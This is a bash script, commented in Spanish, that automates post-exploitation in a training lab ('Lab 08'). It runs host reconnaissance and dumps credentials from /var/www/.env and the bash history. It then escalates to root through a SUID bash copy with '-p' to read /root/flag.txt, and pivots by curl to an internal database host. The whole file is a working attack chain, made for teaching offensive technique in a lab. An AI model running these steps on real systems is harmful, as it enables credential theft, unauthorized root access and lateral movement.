#!/usr/bin/env bash
# Post-explotacion del Lab 08 (Partes 1 y 2: R1 a R4).
#   Parte 1 -> R1 reconocimiento del host, R2 loot de credenciales.
#   Parte 2 -> R3 escalada de privilegios (SUID), R4 pivoting al host interno.
# Ejecutar dentro del host comprometido (make shell-victima como operador).
set -euo pipefail

echo "=== 1. Identidad y Sistema (Situational Awareness) ==="
id
whoami
hostname
uname -a
echo

echo "=== 2. Entorno y Red ==="
ip -br a 2>/dev/null || ip a
env | grep -E 'DEPLOY|USER|PATH|SHELL'
echo

echo "=== 3. R1 · Archivos en /opt (Reconocimiento del Host) ==="
ls -la /opt/phantom-deploy
cat /opt/phantom-deploy/DEPLOY_NOTES.txt
echo

echo "=== 4. R2 · Loot de credenciales (.env y bash_history) ==="
cat /var/www/.env
echo
echo "--- ~/.bash_history ---"
cat ~/.bash_history
echo

echo "=== 5. R3 · Escalada de privilegios (binarios SUID) ==="
echo "[*] Binarios con bit SUID (uno no es estandar):"
find / -perm -4000 -type f 2>/dev/null || true   # find sale !=0 por dirs sin permiso
echo "[*] Binario sospechoso (copia de bash con SUID root):"
ls -la /usr/local/bin/system-check 2>/dev/null || true
echo "[*] Explotacion GTFOBins: bash SUID con -p conserva euid=0(root):"
/usr/local/bin/system-check -p -c 'id; cat /root/flag.txt'
echo

echo "=== 6. R4 · Pivoting al host interno (red segmentada) ==="
echo "[*] Interfaces de red (la victima es dual-homed: labnet + internalnet):"
ip -br a 2>/dev/null || ip a
echo "[*] Pivot: el host interno phantomcorp-db solo se alcanza DESDE aca:"
curl -s http://phantomcorp-db/ ; echo
